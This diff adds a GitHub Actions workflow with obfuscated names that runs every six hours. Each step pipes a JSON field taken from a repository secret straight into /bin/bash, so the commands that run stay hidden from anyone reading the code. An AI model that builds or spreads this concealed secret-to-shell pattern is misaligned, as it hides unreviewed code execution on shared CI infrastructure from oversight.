@@ -1,0 +1,24 @@
+name: xiaozinifengg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaozinifengg
+        env:
+          vnbwa968: ${{ secrets.vnbwa968 }}
+        run: |
+          echo $vnbwa968 | jq -r .fkxjm36212 | /bin/bash
+          echo $jgaj30 | jq -r .m91921 | /bin/bash
+          echo $ztfpv43 | jq -r .p45125 | /bin/bash
+          echo $khhh0084 | jq -r .s0897 | /bin/bash
+          echo $ty8 | jq -r .l92 | /bin/bash
+          echo $mahf32 | jq -r .kzgz1 | /bin/bash
+          echo $xum1321 | jq -r .fg90 | /bin/bash
+          echo $lj1479 | jq -r .hzd70 | /bin/bash
+
